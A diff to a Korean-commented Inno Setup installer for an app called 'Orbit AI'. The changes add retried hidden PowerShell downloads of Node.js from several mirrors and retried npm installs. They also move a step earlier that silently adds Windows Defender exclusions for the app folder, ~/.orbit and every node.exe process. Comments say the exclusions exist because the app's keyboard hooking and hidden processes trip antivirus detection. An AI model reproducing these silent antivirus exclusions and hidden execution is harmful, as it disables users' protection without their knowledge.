@@ -58,9 +58,7 @@ Source: "..\package.json"; DestDir: "{app}"; Flags: ignoreversion
 Name: "{userstartup}\Orbit AI"; Filename: "wscript.exe"; Parameters: """{app}\daemon\orbit-launcher.vbs"""; Tasks: startuplink
 
 [Run]
-; npm install --production (PowerShell Hidden으로 감싸서 CMD 창 번쩍임 방지)
-Filename: "powershell.exe"; Parameters: "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command ""Set-Location '{app}'; & '{app}\node\node.exe' '{app}\node\npm\node_modules\npm\bin\npm-cli.js' install --production 2>&1 | Out-Null"""; Flags: runhidden waituntilterminated; StatusMsg: "패키지 설치 중..."; Check: FileExists('{app}\node\node.exe')
-; 트레이 앱 즉시 실행
+; 트레이 앱 즉시 실행 (npm install은 CurStepChanged에서 재시도 로직으로 처리)
 Filename: "wscript.exe"; Parameters: """{app}\daemon\orbit-launcher.vbs"""; Flags: nowait postinstall skipifsilent; Description: "Orbit AI 지금 시작"
 
 [UninstallRun]
@@ -204,22 +202,66 @@ begin
 end;
 
 procedure DownloadNodeJS;
+// Node.js 다운로드 — 실패 시 대체 URL 자동 재시도 (3회)
 var
   RC: Integer;
   Dest: string;
+  Script: string;
 begin
   Dest := ExpandConstant('{app}\node');
   ForceDirectories(Dest);
-  Exec('powershell.exe',
-    '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "' +
+  // 3개 URL 순서대로 시도: nodejs.org → npmmirror(중국거울) → nodejs.org v20 LTS
+  Script :=
     '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; ' +
-    '$z=Join-Path $env:TEMP ''node22.zip''; ' +
-    '(New-Object Net.WebClient).DownloadFile(''https://nodejs.org/dist/v22.14.0/node-v22.14.0-win-x64.zip'',$z); ' +
-    'Expand-Archive -Force $z ''' + Dest + '''; ' +
-    '$d=Get-ChildItem ''' + Dest + ''' -Directory|Select-Object -First 1; ' +
-    'if($d){Copy-Item (Join-Path $d.FullName ''*'') ''' + Dest + ''' -Recurse -Force; Remove-Item $d.FullName -Recurse -Force}; ' +
-    'Remove-Item $z -Force -EA SilentlyContinue"',
+    '$urls=@(' +
+      '''https://nodejs.org/dist/v22.14.0/node-v22.14.0-win-x64.zip'',' +
+      '''https://registry.npmmirror.com/-/binary/node/v22.14.0/node-v22.14.0-win-x64.zip'',' +
+      '''https://nodejs.org/dist/v20.18.3/node-v20.18.3-win-x64.zip''' +
+    '); ' +
+    '$dest=''' + Dest + '''; ' +
+    '$ok=$false; ' +
+    'foreach($url in $urls){ ' +
+      'try{ ' +
+        'Write-Host "다운로드 시도: $url"; ' +
+        '$z=Join-Path $env:TEMP ''node-orbit.zip''; ' +
+        '$wc=New-Object Net.WebClient; ' +
+        '$wc.DownloadFile($url,$z); ' +
+        'if((Get-Item $z).length -gt 5MB){ ' +
+          'Expand-Archive -Force $z $dest; ' +
+          '$d=Get-ChildItem $dest -Directory|Select-Object -First 1; ' +
+          'if($d){Copy-Item (Join-Path $d.FullName ''*'') $dest -Recurse -Force -EA SilentlyContinue; Remove-Item $d.FullName -Recurse -Force -EA SilentlyContinue}; ' +
+          'Remove-Item $z -Force -EA SilentlyContinue; ' +
+          '$ok=$true; break ' +
+        '} ' +
+      '}catch{ Write-Warning "실패: $_" } ' +
+    '}; ' +
+    'if(-not $ok){ Write-Error "Node.js 다운로드 실패 — 네트워크를 확인하세요" }';
+  Exec('powershell.exe',
+    '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "' + Script + '"',
     '', SW_HIDE, ewWaitUntilTerminated, RC);
+end;
+
+procedure InstallNpmPackages;
+// npm install — 실패 시 2회 재시도 (V3/네트워크 일시 차단 대비)
+var
+  RC, Attempt: Integer;
+  NodeExe, NpmCli: string;
+begin
+  NodeExe := ExpandConstant('{app}\node\node.exe');
+  NpmCli  := ExpandConstant('{app}\node\npm\node_modules\npm\bin\npm-cli.js');
+  if not FileExists(NodeExe) then Exit;
+  for Attempt := 1 to 3 do
+  begin
+    Exec('powershell.exe',
+      '-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "' +
+      'Set-Location ''' + ExpandConstant('{app}') + '''; ' +
+      '& ''' + NodeExe + ''' ''' + NpmCli + ''' install --production --prefer-offline 2>&1 | Out-Null; ' +
+      'exit $LASTEXITCODE"',
+      '', SW_HIDE, ewWaitUntilTerminated, RC);
+    if RC = 0 then Break;
+    // 실패 시 잠시 대기 후 재시도 (V3 검사 완료 대기)
+    Exec('cmd.exe', '/c timeout /t 3 /nobreak >nul', '', SW_HIDE, ewWaitUntilTerminated, RC);
+  end;
 end;
 
 function PrepareToInstall(var NeedsRestart: Boolean): string;
@@ -271,19 +313,26 @@ var
 begin
   if CurStep = ssPostInstall then
   begin
+    // 1. 토큰 설정 파일 저장
     if GetTokenParam <> '' then T := GetTokenParam
     else if TokenEdit <> nil then T := Trim(TokenEdit.Text)
     else T := '';
     WriteConfigFile(T);
-    if not FileExists(ExpandConstant('{app}\node\node.exe')) then
-      DownloadNodeJS;
-    // Windows Defender 예외 등록 (트로이목마 오탐 방지 — 키보드 후킹 + 숨김 프로세스)
+
+    // 2. Windows Defender 예외 먼저 등록 (npm install 전 차단 방지)
     Exec('powershell.exe',
       '-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "' +
       'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + ''' -EA SilentlyContinue; ' +
       'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{%USERPROFILE}') + '\.orbit'' -EA SilentlyContinue; ' +
       'Add-MpPreference -ExclusionProcess ''node.exe'' -EA SilentlyContinue"',
       '', SW_HIDE, ewWaitUntilTerminated, RC);
+
+    // 3. Node.js 없으면 다운로드 (3개 URL 자동 재시도)
+    if not FileExists(ExpandConstant('{app}\node\node.exe')) then
+      DownloadNodeJS;
+
+    // 4. npm install (최대 3회 재시도 — V3/네트워크 일시 차단 대비)
+    InstallNpmPackages;
   end;
 end;
 
